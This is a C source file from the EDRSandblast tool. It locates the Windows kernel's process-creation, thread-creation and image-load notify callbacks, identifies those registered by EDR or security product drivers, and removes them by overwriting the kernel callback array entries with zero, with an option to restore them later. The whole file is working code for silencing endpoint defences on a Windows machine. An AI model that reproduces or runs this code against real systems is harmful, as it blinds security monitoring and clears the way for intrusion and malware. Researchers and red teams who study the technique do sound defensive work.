/*

--- Kernel callbacks operations.
--- Inspiration and credit: https://github.com/br-sn/CheekyBlinder

*/

#include <Windows.h>

#include "../EDRSandblast.h"
#include "FileUtils.h"
#include "FileVersion.h"
#include "IsEDRChecks.h"
#include "KernelMemoryPrimitives.h"
#include "KernelUtils.h"
#include "NtoskrnlOffsets.h"
#include "PEParser.h"
#include "PdbSymbols.h"

#include "KernelCallbacks.h"

const TCHAR* notifyRoutineTypeStrs[3] = { TEXT("process creation"), TEXT("thread creation"), TEXT("image loading") };
const TCHAR* notifyRoutineTypeNames[3] = { TEXT("ProcessCreate"), TEXT("ThreadCreate"), TEXT("LoadImage") };
DWORD64 GetNotifyRoutineAddress(enum NtoskrnlOffsetType nrt);

BOOL EnumEDRSpecificNotifyRoutineCallbacks(enum NtoskrnlOffsetType notifyRoutineType, struct FOUND_EDR_CALLBACKS* edrCallbacks, BOOL verbose) {
    DWORD64 NotifyRoutineAddress = GetNotifyRoutineAddress(notifyRoutineType);
    _tprintf_or_not(TEXT("[+] [NotifyRountines]\tEnumerating %s callbacks\n"), notifyRoutineTypeStrs[notifyRoutineType]);
    if (verbose) { _tprintf_or_not(TEXT("[+] [NotifyRountines]\tPsp%sNotifyRoutine: 0x%I64x\n"), notifyRoutineTypeNames[notifyRoutineType], NotifyRoutineAddress); }

    SIZE_T CurrentEDRCallbacksCount = 0;
    for (int i = 0; i < PSP_MAX_CALLBACKS; ++i) {
        DWORD64 callback_struct = ReadMemoryDWORD64(NotifyRoutineAddress + (i * sizeof(DWORD64)));
        if (callback_struct != 0) {
            DWORD64 callback = (callback_struct & ~0b1111) + 8; //TODO : replace this hardcoded offset ?
            DWORD64 cbFunction = ReadMemoryDWORD64(callback);
            DWORD64 driverOffset;
            TCHAR* driver = FindDriverName(cbFunction, &driverOffset);
            _tprintf_or_not(TEXT("[+] [NotifyRountines]\t\t%016llx [%s + 0x%llx]\n"), cbFunction, driver, driverOffset);

            if (driver && isDriverNameMatchingEDR(driver)) { //TODO : also use certificates to determine if EDR
                DWORD64 callback_addr = NotifyRoutineAddress + (i * sizeof(DWORD64));

                struct KRNL_CALLBACK newFoundDriver = { 0 };
                newFoundDriver.type = NOTIFY_ROUTINE_CB;
                newFoundDriver.driver_name = driver;
                newFoundDriver.addresses.notify_routine.callback_struct_addr = callback_addr;
                newFoundDriver.addresses.notify_routine.callback_struct = callback_struct;
                newFoundDriver.addresses.notify_routine.type = notifyRoutineType;
                newFoundDriver.callback_func = cbFunction;

                _tprintf_or_not(TEXT("[+] [NotifyRountines]\t\tFound callback belonging to EDR driver %s"), driver);
                if (verbose) {
                    _tprintf_or_not(TEXT(" [callback addr : 0x%I64x | callback struct : 0x%I64x | callback function : 0x%I64x]\n"), callback_addr, callback_struct, cbFunction);
                }
                else {
                    _putts_or_not(TEXT(""));
                }
                newFoundDriver.removed = FALSE;
                
                edrCallbacks->EDR_CALLBACKS[edrCallbacks->index] = newFoundDriver;
                edrCallbacks->index++;
                CurrentEDRCallbacksCount++;
            }
        }
    }

    if (CurrentEDRCallbacksCount == 0) {
        _putts_or_not(TEXT("[+] [NotifyRountines]\tNo EDR driver(s) found!"));
    }
    else {
        _tprintf_or_not(TEXT("[+] [NotifyRountines]\tFound a total of %llu EDR / security products driver(s)\n"), CurrentEDRCallbacksCount);
    }
    return CurrentEDRCallbacksCount > 0;
}

void RemoveOrRestoreSpecificEDRNotifyRoutineCallbacks(enum NtoskrnlOffsetType notifyRoutineType, struct FOUND_EDR_CALLBACKS* edrCallbacks, BOOL remove) {
    TCHAR* action = remove ? TEXT("Removing") : TEXT("Restoring");
    _tprintf_or_not(TEXT("[+] [NotifyRountines]\t%s %s callbacks\n"), action, notifyRoutineTypeStrs[notifyRoutineType]);

    for (DWORD i = 0; i < edrCallbacks->index; ++i) {
        struct KRNL_CALLBACK* cb = &edrCallbacks->EDR_CALLBACKS[i];
        if (cb->type == NOTIFY_ROUTINE_CB && 
            cb->addresses.notify_routine.type == notifyRoutineType &&
            cb->removed == !remove) {
            _tprintf_or_not(TEXT("[+] [NotifyRountines]\t%s callback of EDR driver \"%s\" [callback addr: 0x%I64x | callback struct: 0x%I64x | callback function: 0x%I64x]\n"),
                action,
                cb->driver_name,
                cb->addresses.notify_routine.callback_struct_addr,
                cb->addresses.notify_routine.callback_struct,
                cb->callback_func);
            DWORD64 value_to_write = remove ? 0 : cb->addresses.notify_routine.callback_struct;
            WriteMemoryDWORD64(cb->addresses.notify_routine.callback_struct_addr, value_to_write);
            cb->removed = !cb->removed;
        }
    }
}

void RemoveOrRestoreEDRNotifyRoutineCallbacks(struct FOUND_EDR_CALLBACKS* edrCallbacks, BOOL remove) {
    RemoveOrRestoreSpecificEDRNotifyRoutineCallbacks(CREATE_PROCESS_ROUTINE, edrCallbacks, remove);
    RemoveOrRestoreSpecificEDRNotifyRoutineCallbacks(CREATE_THREAD_ROUTINE, edrCallbacks, remove);
    RemoveOrRestoreSpecificEDRNotifyRoutineCallbacks(LOAD_IMAGE_ROUTINE, edrCallbacks, remove);
}


/*

------ Generic callbacks manipulation.

*/


DWORD64 GetNotifyRoutineAddress(enum NtoskrnlOffsetType nrt) {
    DWORD64 Ntoskrnlbaseaddress = FindNtoskrnlBaseAddress();
    DWORD64 Psp_X_NotifyRoutineOffset = g_ntoskrnlOffsets.ar[nrt];
    DWORD64 Psp_X_NotifyRoutineAddress = Ntoskrnlbaseaddress + Psp_X_NotifyRoutineOffset;
    return Psp_X_NotifyRoutineAddress;
}

/*

------ All EDR Kernel callbacks enumeration / removal.

*/

BOOL EnumEDRNotifyRoutineCallbacks(struct FOUND_EDR_CALLBACKS* edrCallbacks, BOOL verbose) {
    BOOL found = FALSE;
    found |= EnumEDRSpecificNotifyRoutineCallbacks(CREATE_PROCESS_ROUTINE, edrCallbacks, verbose);
    found |= EnumEDRSpecificNotifyRoutineCallbacks(CREATE_THREAD_ROUTINE, edrCallbacks, verbose);
    found |= EnumEDRSpecificNotifyRoutineCallbacks(LOAD_IMAGE_ROUTINE, edrCallbacks, verbose);
    return found;
}

void RemoveEDRNotifyRoutineCallbacks(struct FOUND_EDR_CALLBACKS* edrCallbacks) {
    RemoveOrRestoreEDRNotifyRoutineCallbacks(edrCallbacks, TRUE);
}

void RestoreEDRNotifyRoutineCallbacks(struct FOUND_EDR_CALLBACKS* edrCallbacks) {
    RemoveOrRestoreEDRNotifyRoutineCallbacks(edrCallbacks, FALSE);
}